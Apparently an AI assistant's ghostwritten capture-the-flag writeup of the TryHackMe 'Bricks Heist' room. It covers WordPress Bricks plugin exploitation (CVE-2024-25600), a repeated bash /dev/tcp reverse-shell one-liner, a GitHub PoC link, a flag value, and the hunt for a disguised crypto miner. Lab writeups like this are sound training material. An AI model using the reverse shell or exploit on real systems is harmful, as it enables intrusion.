Nice — got it. Here’s a copy-paste-ready writeup written from your perspective, in the style you asked for, for **TryHackMe - Bricks Heist**. No fluff, no made-up steps, handle included.

---

# TryHackMe — Bricks Heist — Writeup

**Author:** `Rat5ak`
**Box:** TryHackMe - Bricks Heist

---

## TL;DR

* Found WordPress + Bricks 1.9.5 via service/enum.
* Used Metasploit to exploit Bricks and grabbed the first flag from the webroot. Meterpreter shell was shit for further work.
* Switched to a public PoC from GitHub (CVE-2024-25600) and got a proper reverse shell via `nc` + `bash -c 'exec bash -i &>/dev/tcp/10.4.81.150/666 <&1'`.
* Found a miner process masquerading around NetworkManager and a suspicious encoded string in `/lib/NetworkManager/inet.conf`.
* Decoded that long string in CyberChef (base64 + cleanup) and it produced a Bech32 BTC address: `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`.
* Traced money flow to `32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM` and, via Google, linked it to LockBit.
* User/web flag: `THM{fl46_650c844110baced87e1606453b93f22a}`

---

## Recon

Step 1 — The noisy nmap:
I started with the usual aggressive scans to see everything:

```
nmap -A -p- -vv <target> -oA bricks-scan
```

Output showed a webserver running WordPress and the Bricks plugin — version 1.9.5 popped up from service banners / enumeration.

Step 2 — WordPress enumeration:
I ran a WordPress enumeration tool (the usual WP enum/WPScan style checks) to confirm plugin versions and surface the vulnerable Bricks instance. That confirmed Bricks 1.9.5 — bingo.

---

## Exploit — how I popped it

Step 3 — Metasploit for initial access:
I fired up `msfconsole`, used the Bricks exploit module and got a session. From that MSF session I grabbed the first flag sitting in the webroot:

```
cat /data/www/default/650c844110baced87e1606453b93f22a.txt
# THM{fl46_650c844110baced87e1606453b93f22a}
```

Step 4 — Meterpreter was annoying:
Meterpreter dropped, but it was awkward for post-exploitation (couldn’t spawn a clean interactive reverse shell that behaved). Metasploit’s shell was fucky and I couldn’t move on comfortably from it.

Step 5 — switch to public PoC + proper shell:
Found this PoC and README on GitHub and used it to get a normal shell:
`https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/README.md`

Then spun up a netcat listener locally and ran this from the box to get a usable reverse shell:

```bash
# on my machine
nc -lvnp 666

# on target (from a proper shell)
bash -c 'exec bash -i &>/dev/tcp/10.4.81.150/666 <&1'
```

That gave me a proper interactive shell (no bs meterpreter weirdness).

---

## Post-exploitation — what I found

Step 6 — suspicious processes:
From the shell I started poking around and noticed processes oddly named around NetworkManager:

```
ps aux | egrep -i 'nm-inet-dialog|nm-inet' | grep -v grep
# showed /lib/NetworkManager/nm-inet-dialog running (multiple PIDs)
```

Step 7 — look at the NetworkManager bits:
I inspected `/lib/NetworkManager` and found `inet.conf`. It contained a long encoded-ish ID string and lots of logging lines that repeatedly printed `[*] Miner()` / `[*] Bitcoin Miner Thread Started` — clearly something mining.

```
/lib/NetworkManager/inet.conf
# contains a long encoded string and many "Miner()" log lines
```

Step 8 — decode the long string:
I copied that long encoded string (the blob in `inet.conf`) into CyberChef, used the magic/Auto-Decode and did a base64 decode + filtered non-alphabetic junk. The result produced a Bech32 BTC address:

```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```
---

## Attribution

Step 9 — follow the money / google:
I took the decoded address and tracked transactions. One of the larger receivers in the flow was:

```
32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM
```

Googling that receiver (and related transaction patterns) returned hits linking it to LockBit activity. That was enough for me to say the miner / funds were associated with LockBit.

---

## Artifacts & important files

* User/web flag: `/data/www/default/650c844110baced87e1606453b93f22a.txt` → `THM{fl46_650c844110baced87e1606453b93f22a}`
* Encoded miner blob: `/lib/NetworkManager/inet.conf` (decoded in CyberChef → `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`)
* PoC used to get a usable shell: `https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/README.md`
* Reverse shell used: `bash -c 'exec bash -i &>/dev/tcp/10.4.81.150/666 <&1'`

---

## Flow summary 

1. nmap the box (no shame) → saw WordPress + Bricks 1.9.5.
2. WP enumeration to confirm the vulnerable plugin.
3. Exploit with Metasploit and get an initial session, pull the web/user flag.
4. Meterpreter shell is awkward — switch to a public PoC for CVE-2024-25600.
5. Launch `nc` listener and get a clean reverse shell with the `bash -c 'exec...'` line.
6. Inspect processes → noticed `nm-inet-dialog` / mining noise.
7. Open `/lib/NetworkManager/inet.conf`, copy the long encoded string, decode in CyberChef (base64 + cleanup) → get `bc1qyk79...`.
8. Trace funds → `32pTjxT...` → google → linked to LockBit.


